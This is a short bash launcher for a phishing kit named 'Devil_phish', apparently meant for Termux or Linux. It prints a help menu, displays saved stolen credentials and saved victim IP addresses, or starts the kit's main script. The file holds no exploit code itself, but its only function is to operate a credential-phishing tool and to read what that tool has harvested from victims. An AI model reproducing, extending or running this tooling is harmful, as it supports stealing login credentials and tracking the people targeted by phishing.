#!/bin/bash


if [[ $(uname -o) == *'Android'* ]];then
	Devil_phish_root="/data/data/com.termux/files/usr/opt/Devil_phish"
else
	export Devil_phish_root="/opt/Devil_phish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Devil_phisher type \`Devil_phish\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $Devil_phish_root/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $Devil_phish_root/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $Devil_phish_root
	bash ./main.sh
fi
